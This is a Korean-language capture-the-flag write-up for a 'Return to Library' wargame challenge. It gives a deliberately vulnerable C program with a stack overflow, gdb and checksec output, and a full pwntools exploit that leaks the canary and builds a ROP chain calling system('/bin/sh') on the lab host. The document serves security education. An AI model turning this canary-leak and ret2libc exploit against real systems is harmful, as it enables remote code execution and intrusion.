## Return to Library
---

```c
// Name: rtl.c
// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```

<br><br>

## Solution
---

gdb로 확인해보니 read에서 ```rbp-0x40```부터 입력을 받으므로 입력을 ```(0x40-0x8 = 0x38)```만큼 해주면 카나리릭 코드에서 카나리를 볼 수 있다.

<br>

```shell
   0x0000000000400772 <+123>:   lea    rax,[rbp-0x40]
   0x0000000000400776 <+127>:   mov    edx,0x100
   0x000000000040077b <+132>:   mov    rsi,rax
   0x000000000040077e <+135>:   mov    edi,0x0
   0x0000000000400783 <+140>:   call   0x4005f0 <read@plt>
```

<br>

이제 ovewrite를 해줘야하는데, checksec을 통해 확인해보면 NX가 걸려있고 확인해보면 스택에 실행권한이 없음을 알 수 있다.

<br>

```shell
pwndbg> checksec
[*] '/home/index/rtl/rtl'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

<br>

걸려있는 보호기법은 ASLR, NX가 있다고 생각하면 된다.

<br>

![image](https://user-images.githubusercontent.com/52172169/185142486-06b26012-03df-431a-a86f-391e80aa1c6b.png)

<br>

이 부분부터는 강의 내용을 토대로 정리..

ASLR이 걸려있으나, PIE는 걸려있지 않으므로 plt의 주소는 고정이 된다.

코드를 보면 이미 system 함수가 사용이 되었으므로 plt에 추가가 되어있다.

또한 코드 내에서 ```/bin/sh``` 문자열이 전역변수로 선언되어 있다.

PIE가 없기 때문에 데이터 영역과 코드 영역의 주소는 고정되어 있으므로 /bin/sh 문자열의 주소는 고정이다.

system 함수의 주소와 문자열의 주소는 아래와 같이 찾을 수 있다.

<br>

```
pwndbg> plt
0x4005b0: puts@plt
0x4005c0: __stack_chk_fail@plt
0x4005d0: system@plt
0x4005e0: printf@plt
0x4005f0: read@plt
0x400600: setvbuf@plt

pwndbg> search /bin/sh
rtl             0x400874 0x68732f6e69622f /* '/bin/sh' */
rtl             0x600874 0x68732f6e69622f /* '/bin/sh' */
libc-2.31.so    0x7ffff7f7f5bd 0x68732f6e69622f /* '/bin/sh' */
```

<br>

pwntools를 이용해서 찾을 수도 있어서 pwntools로 가져왔다.

따라서 system plt 주소에 인자로 /bin/sh를 주면 되는데, 64비트에서는 함수의 인자는 rdi에 담긴다.

따라서 rdi 가젯을 찾아야 한다.

```ROPgadget --binary ./rtl --re "pop rdi"```

<br>

여기서 한가지 주의할 점은, system 함수로 rip가 이동할 때, 스택은 반드시 0x10단위로 정렬되어 있어야 한다는 것이라고 한다.

이는 system 함수 내부에 있는 movaps 명령어 때문인데, 이 명령어는 스택이 0x10단위로 정렬되어 있지 않으면 Segmentation Fault를 발생시킨다고 한다.

따라서 ret 가젯을 찾으면 된다고 한다..

<br>

```python
from pwn import *

# p = process('./rtl')

p = remote('host3.dreamhack.games',13227)

elf = ELF('./rtl')

canary_leak_payload = b"A"*0x39
p.sendafter(b"Buf: ",canary_leak_payload)

p.recvuntil(canary_leak_payload)
canary = u64(b"\x00"+ p.recvn(7))
print("[+] Canary : ",canary)


system_plt_addr = elf.plt['system']
binsh = next(elf.search(b'/bin/sh\x00'))
pop_rdi = 0x0000000000400853
ret = 0x0000000000400285

print("[+] system@plt: ", hex(system_plt_addr))
print("[+] /bin/sh : ", hex(binsh))

overwrite_payload = b"A"*0x38 + p64(canary) + b"B"*0x8 + p64(ret)+p64(pop_rdi) + p64(binsh)+ p64(system_plt_addr)

p.send(overwrite_payload)
p.interactive()
```
